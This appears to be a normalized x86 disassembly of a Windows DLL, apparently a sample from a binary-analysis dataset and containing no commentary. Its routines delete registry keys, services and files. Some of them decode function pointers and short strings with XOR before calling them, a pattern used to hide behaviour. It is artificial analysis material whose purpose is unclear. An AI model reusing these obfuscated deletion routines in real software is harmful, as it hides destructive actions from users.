push 0x0
lea edx [ ebp - 0x14 ]
push edx
push eax
mov [ ebp - 0x488 ] 0x208
call [ RegQueryValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov edx 0x104
lea eax [ ebp - 0x264 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x47c ]
push ecx
call [ RegCloseKey@IAT ]
test esi esi
jne r-xdata
mov esi 0x2
mov esi [ ebp - 0x490 ]
mov edx [ ebp - 0x48c ]
push edx
lea eax [ ebp - 0x46c ]
push eax
call [ StrStrW@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x264 ]
push ecx
push 0x80000002
call [ RegDeleteKeyW@IAT ]
imul edi edi 0x2c
mov edx [ ebp - 0x470 ]
mov eax [ edi + edx ]
push 0xf01ff
push eax
push ebx
call [ OpenServiceW@IAT ]
mov esi eax
push esi
call [ DeleteService@IAT ]
push esi
mov [ ebp - 0x484 ] eax
call [ CloseServiceHandle@IAT ]
sub_1002836c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
push [ ebp + 0x8 ]
call sub_10030a9f
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10028397
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_10056814
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_100283e0
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x58
push ebx
call sub_10024af0
mov esi [ ebp + 0xc ]
mov edi eax
mov ecx 0x16
[ edi ] [ esi ]
mov ecx [ eax + 0xc ]
and ecx 0xfffffffd
or ecx [ ebp + 0x10 ]
lea esi [ eax + 0x10 ]
push esi
or ecx 0x1
push 0x1
xor edi edi
push ebx
mov [ ebp - 0x4 ] eax
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] 0xffffffff
mov [ eax + 0xc ] ecx
call sub_10004e00
lea eax [ esi + 0x3c ]
mov esi [ ebp + 0xc ]
mov edx [ esi + 0x50 ]
push eax
push edx
push ebx
mov [ ebp - 0x10 ] eax
call sub_10004e00
add esp 0x20
mov [ ebp + 0x10 ] edi
cmp [ esi + 0x50 ] edi
jbe r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ esi + 0x4c ]
mov ecx [ ebp + 0x10 ]
mov esi [ eax + ecx * 4 ]
push 0x4c
push ebx
mov [ ebp - 0x8 ] esi
call sub_10024af0
mov edi eax
mov ecx 0x13
[ edi ] [ esi ]
mov edi [ ebp - 0x8 ]
mov edx [ edi + 0x4 ]
push edx
push ebx
mov [ ebp - 0xc ] eax
call sub_1002bb60
mov esi [ ebp - 0xc ]
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x10 ]
push eax
push ebx
call sub_1002bb60
mov ecx [ ebp - 0x10 ]
push ecx
push esi
push ebx
mov [ esi + 0x10 ] eax
call sub_100520a0
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
inc eax
add esp 0x24
mov [ ebp + 0x10 ] eax
cmp eax [ edx + 0x50 ]
jb r-xdata
mov esi edx
sub_100284b9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1007bf47
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10028500
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x8 ]
mov [ edx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_1005927e
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_10028540
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x1
jl r-xdata
cmp eax 0xb
je r-xdata
cmp eax 0x8
jle r-xdata
mov eax 0x1
pop ebp
retn
cmp eax 0xe
jl r-xdata
cmp eax 0x7f
jl r-xdata
cmp eax 0x1f
jle r-xdata
cmp eax 0xfdd0
jl r-xdata
cmp eax 0x9f
jle r-xdata
and eax 0xffff
cmp eax 0xfffe
je r-xdata
cmp eax 0xfdef
jle r-xdata
cmp eax 0xffff
je r-xdata
xor eax eax
pop ebp
retn
sub_100285a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0xc
call sub_1005ac7e
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
push edi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call [ SysAllocString@IAT ]
mov [ esi ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x8007000e
call sub_1004dba0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ eax ] esi
test esi esi
jne r-xdata
test edi edi
je r-xdata
push 0x8007000e
call sub_1004dba0
sub_10028640
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x15 ] 0x0
mov esi ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ edi + 0x8 ] 0x0
pop edi
pop esi
pop ebx
retn
mov ecx [ esi + 0x8 ]
push ecx
mov ecx edi
call sub_100367b0
mov esi [ esi ]
push ebx
call sub_10065045
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov ebx esi
je r-xdata
sub_1002868d
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000833b
add esp 0x14
pop ebp
retn
sub_100286b0
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ rw-data ]
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov al 0x38
xor [ ebp + 0x8 ] al
xor [ ebp + 0x9 ] al
xor [ ebp + 0xa ] al
xor [ ebp + 0xb ] al
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] 0x4
call [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_10028710
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fda0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor edi edi
push 0x10
mov [ ebp - 0x4 ] edi
call sub_1005ac7e
add esp 0x4
cmp eax edi
je r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_100287d0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10009180
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call [ lstrlenA@IAT ]
lea edi [ eax + 0x1 ]
mov [ ebp - 0x20 ] edi
push 0x0
push 0x0
push edi
push esi
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea eax [ esi + esi ]
cmp esi 0x1000
jge r-xdata
call [ GetLastError@IAT ]
test eax eax
jle r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_10056814
add esp 0x4
mov ebx eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
call sub_1007c030
mov [ ebp - 0x18 ] esp
mov eax esp
mov ebx eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
push eax
call sub_1004dba0
and eax 0xffff
or eax 0x80070000
test ebx ebx
jne r-xdata
push esi
push ebx
push edi
mov ecx [ ebp + 0x8 ]
push ecx
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push 0x8007000e
call sub_1004dba0
push ebx
call [ SysAllocString@IAT ]
mov edi eax
cmp esi 0x1000
jl r-xdata
cmp esi 0x1000
jl r-xdata
test edi edi
jne r-xdata
push ebx
call sub_10020a90
add esp 0x4
call [ GetLastError@IAT ]
test eax eax
jle r-xdata
push ebx
call sub_10020a90
add esp 0x4
mov eax edi
push 0x8007000e
call sub_1004dba0
push eax
call sub_1004dba0
and eax 0xffff
or eax 0x80070000
sub_10028950
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x14
sub_10028980
push ebp
mov ebp esp
sub esp 0x42c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
push edi
push edi
push edi
push edi
lea ecx [ ebp - 0x41c ]
push ecx
push edi
push edi
push edi
push edi
mov [ ebp - 0x428 ] eax
mov eax [ ebp + 0xc ]
mov esi [ eax ]
push edi
push edi
push esi
mov [ ebp - 0x418 ] edi
call [ RegQueryInfoKeyW@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x41c ] edi
jbe r-xdata
push esi
call [ RegCloseKey@IAT ]
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push esi
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x418 ]
pop edi
xor ecx ebp
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ RegEnumValueW@IAT ]
inc edi
cmp edi [ ebp - 0x41c ]
jb r-xdata
cmp [ ebp - 0x42c ] 0x1
jne r-xdata
lea edx [ ebp - 0x424 ]
push edx
lea eax [ ebp - 0x20c ]
push eax
lea ecx [ ebp - 0x42c ]
push ecx
push 0x0
lea edx [ ebp - 0x420 ]
push edx
lea eax [ ebp - 0x414 ]
push eax
push edi
push esi
mov [ ebp - 0x420 ] 0x104
mov [ ebp - 0x424 ] 0x208
call ebx
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x428 ]
push ecx
lea edx [ ebp - 0x20c ]
push edx
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
pop ebx
mov [ ebp - 0x418 ] 0x1
sub_10028a90
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov esi [ edi ]
test esi esi
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ edi ] eax
test eax eax
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edi eax
mov eax 0x2
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov edi eax
mov [ esi + 0x4 ] eax
test edi edi
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
mov ebx [ ebp + 0x8 ]
mov esi eax
call sub_10017e80
jmp r-xdata
push 0x58
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea eax [ edi + 0x1 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edi + 0x4 ] 0x0
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov [ edi ] eax
test eax eax
je r-xdata
sub_10028b2b
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001f9c0
add esp 0xc
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
mov eax 0x7fffffff
pop ebp
retn
pop ebp
jmp sub_10004dbc
sub_10028b72
push 0x28
mov eax sub_1007e5a2
call sub_10050d0f
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x34
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
mov [ esi + 0x28 ] cl
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_1001a8af
mov [ esi ] r--data
jmp r-xdata
sub_10028c10
push ebp
mov ebp esp
sub esp 0x420
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x104
lea eax [ ebp - 0x210 ]
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
call sub_100671c0
lea ecx [ ebp - 0x210 ]
push ecx
call sub_100267d0
lea edx [ ebp - 0x210 ]
add esp 0x4
push edx
call sub_10004b60
lea eax [ ebp - 0x210 ]
add esp 0x4
push eax
call sub_10028060
lea ecx [ ebp - 0x210 ]
add esp 0x4
push ecx
call sub_100352e0
mov eax [ rw-data ]
add esp 0x4
test eax eax
je r-xdata
call sub_1003e530
lea ecx [ ebp - 0x418 ]
push ecx
push 0x104
call [ GetCurrentDirectoryW@IAT ]
lea edx [ ebp - 0x418 ]
push edx
call [ PathAddBackslashW@IAT ]
lea edx [ ebp - 0x418 ]
call sub_10045840
push 0x0
call [ ExitProcess@IAT ]
push eax
call [ ReleaseMutex@IAT ]
mov edx [ rw-data ]
mov al 0x38
mov [ ebp - 0x41c ] edx
xor [ ebp - 0x41c ] al
xor [ ebp - 0x41b ] al
xor [ ebp - 0x41a ] al
xor [ ebp - 0x419 ] al
mov eax [ rw-data ]
push eax
call [ ebp - 0x41c ]
sub_10028d10
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
mov ecx [ edi ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] eax
call sub_1006ec80
xor esi esi
add esp 0x8
cmp [ edi + 0xc ] esi
jbe r-xdata
lea eax [ edi + 0x8 ]
push eax
lea ecx [ ebp - 0x10 ]
push ecx
call sub_1005fce0
lea edx [ ebp - 0x10 ]
push edi
push edx
call sub_10030ff0
add esp 0x10
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x8 ]
mov ecx [ eax + esi * 4 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
call sub_1005d190
inc esi
add esp 0x8
cmp esi [ edi + 0xc ]
jb r-xdata
sub_10028d80
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10064220
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_10028de0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081128
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
xor eax eax
mov [ ebp - 0x38 ] ax
mov eax edi
mov [ ebp - 0x24 ] 0x7
mov [ ebp - 0x28 ] esi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x38 ]
call sub_1005e3c0
mov [ ebp - 0x4 ] esi
mov edx [ ebp - 0x24 ]
mov esi [ ebp - 0x38 ]
mov ecx esi
cmp edx 0x8
jae r-xdata
mov eax esi
jmp r-xdata
lea ecx [ ebp - 0x38 ]
mov eax ecx
mov ebx [ ebp - 0x28 ]
lea ebx [ eax + ebx * 2 ]
mov eax esi
cmp edx 0x8
jae r-xdata
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x38 ]
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
push ecx
lea ecx [ ebp - 0x3c ]
push ecx
call sub_100435b0
add esp 0x8
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfffb
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0x4
jb r-xdata
xor eax eax
mov [ ebp - 0x14 ] ax
lea eax [ ebp - 0x1c ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x1c ]
push ecx
lea edx [ ebp - 0x38 ]
push edx
call sub_10009310
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax edi
lea edx [ eax + 0x2 ]
lea esp [ esp ]
cmp [ ebp - 0x24 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x38 ]
call sub_1005e3c0
mov ebx [ ebp - 0x24 ]
mov ecx [ ebp - 0x38 ]
mov eax ecx
cmp ebx 0x8
jae r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x38 ]
push eax
call sub_10065045
add esp 0x4
cmp [ eax ] 0x22
mov eax ecx
jne r-xdata
lea eax [ ebp - 0x38 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
cmp ebx 0x8
jae r-xdata
cmp ebx 0x8
jae r-xdata
lea esi [ esi + esi + 0x8 ]
push esi
push eax
push edi
call sub_10078600
add esp 0xc
xor edx edx
mov [ esi + edi ] dx
lea eax [ ebp - 0x38 ]
lea esi [ esi + esi + 0x6 ]
push esi
add eax 0x2
push eax
push edi
call sub_10078600
add esp 0xc
xor ecx ecx
mov [ esi + edi ] cx
jmp r-xdata
lea eax [ ebp - 0x38 ]
xor eax eax
mov eax [ ebp - 0x38 ]
push eax
call sub_10065045
add esp 0x4
cmp ebx 0x8
jb r-xdata
sub_10028f9e
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10041d5f
add esp 0x10
test eax eax
jns r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_10028fe0
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
call edx
cmp [ esi + 0x84 ] 0x8
lea eax [ esi + 0x70 ]
jb r-xdata
xor eax eax
pop esi
retn
push eax
call [ DeleteFileW@IAT ]
pop esi
retn
mov eax [ eax ]
sub_1002900a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_100254fa
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_100305d6
jmp r-xdata
sub_1002903f
mov edi edi
push ebp
mov ebp esp
push ecx
mov cx [ ebp + 0x8 ]
movzx eax cx
mov edx 0xffff
mov [ ebp - 0x4 ] eax
cmp cx dx
je r-xdata
leave
retn
mov edx [ ebp + 0xc ]
push esi
mov esi [ edx ]
mov edx 0x100
test esi esi
jne r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push edx
push esi
call sub_100471a2
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push edi
pop edi
cmp cx dx
jae r-xdata
pop esi
mov eax [ ebp - 0x4 ]
lea edx [ ecx - 0x41 ]
cmp dx 0x19
ja r-xdata
add cx 0x20
movzx eax cx
jmp r-xdata
sub_100290c0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x24 ] 0x0
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x26
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x6 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0x28 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x28 ]
mov eax edx
lea esi [ eax + 0x2 ]
jmp r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
lea esi [ edi + 0x40 ]
push edx
mov ecx esi
call sub_1005e3c0
mov ecx [ ebp - 0x28 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi + 0x10 ]
push r--data
xor edi edi
mov ecx esi
mov [ ebp - 0x24 ] 0x0
call sub_1005e510
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax 0xfffffffe
pop esi
xor ecx ebp
add eax 0x2
pop edi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_100291c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080e70
mov eax [ fs : 0x0 ]
push eax
sub esp 0x184
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x168 ] ecx
mov ecx [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x16c ] edx
mov [ ebp - 0x170 ] ecx
cmp [ eax + 0xec ] ebx
jne r-xdata
mov ecx [ eax + 0x108 ]
add ecx [ eax + 0x100 ]
mov edx [ eax + 0x50 ]
lea esi [ ecx * 8 ]
sub esi ecx
mov ecx [ eax + 0xd8 ]
lea edx [ esi + edx + 0x2e ]
cmp ecx edx
jbe r-xdata
lea eax [ ebx + 0x42 ]
jmp r-xdata
mov ecx 0x1f4
sub ecx edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x170 ]
cmp [ edx + 0x10 ] ebx
mov edi [ ebp - 0x164 ]
sete al
xor ecx ecx
cmp al bl
sete cl
lea esi [ ebp - 0x154 ]
add ecx 0x6
push ecx
call sub_10042df0
mov [ ebp - 0x4 ] ebx
push 0x2
push r--data
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x88 ] 0xf
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] bl
call sub_1005d090
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov [ ebp - 0x15c ] eax
mov eax [ eax + 0x10c ]
shr ecx 0x3
mov [ ebp - 0x15c ] ecx
cmp ecx eax
jbe r-xdata
push esi
lea eax [ ebp - 0x154 ]
call sub_100657d0
mov esi [ ebp - 0x164 ]
push eax
push esi
lea edi [ ebp - 0x9c ]
call sub_1001ad10
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_1003b4a6
push edi
push esi
lea eax [ ebp - 0x154 ]
call sub_1002a5c0
mov edx [ ebp - 0x168 ]
push edx
mov [ ebp - 0x184 ] eax
lea eax [ ebp - 0x10c ]
push r--data
push eax
call sub_10051900
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ edi + 0x1c ]
push eax
lea eax [ ebp - 0x154 ]
call sub_100657d0
push eax
push esi
lea edi [ ebp - 0x10c ]
call sub_1001ad10
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ edi + 0x1c ]
push eax
push esi
lea eax [ ebp - 0x154 ]
call sub_1002a5c0
push 0x3
push r--data
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x168 ] eax
mov [ ebp - 0xa4 ] 0xf
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] bl
call sub_1005d090
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ edi + 0x38 ]
push eax
